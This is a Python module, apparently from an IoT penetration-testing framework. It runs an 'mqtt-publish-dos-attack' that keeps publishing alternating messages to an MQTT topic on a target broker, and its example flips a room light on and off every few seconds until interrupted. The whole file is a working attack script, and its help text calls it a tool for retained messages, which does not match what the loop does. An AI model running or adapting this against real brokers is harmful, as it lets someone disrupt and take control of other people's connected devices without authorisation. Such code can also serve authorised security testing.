import paho.mqtt.publish as publish
from core.ip import DEFAULT_IP
import time
import argparse
ip_add = DEFAULT_IP

def parse_args(args):
    parser = argparse.ArgumentParser(prog="frame.py mqtt-publish-dos-attack",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     description="This module help in the creation of mqtt server retained messages.",
                                     epilog="""Example usage:

    frame.py -ip 192.168.8.200 mqtt-publish-dos-attack -top room/light -msg1 on -msg2 off""")

    parser.add_argument("-top", "--topic", help="Topic to Publish in MQTT server", type=str)
    parser.add_argument("-msg1", "--message1", help="Message1 to Publish", type=str)
    parser.add_argument("-msg2", "--message2", help="Message2 to Publish", type=str)

    args = parser.parse_args(args)
    return args

def pblish_dos(args):
    try:
        while True:
            publish.single(args.topic, args.message1 , hostname=ip_add)
            print ("Now Light will be "+ str(args.message1))
            time.sleep(3)
            publish.single(args.topic, args.message2 , hostname=ip_add)
            print ("Now Light will be "+ str(args.message2))
            time.sleep(5)

    except KeyboardInterrupt:
        print("\n ATTACK STOPED")

def module_main(args):
    args = parse_args(args)
    pblish_dos(args)
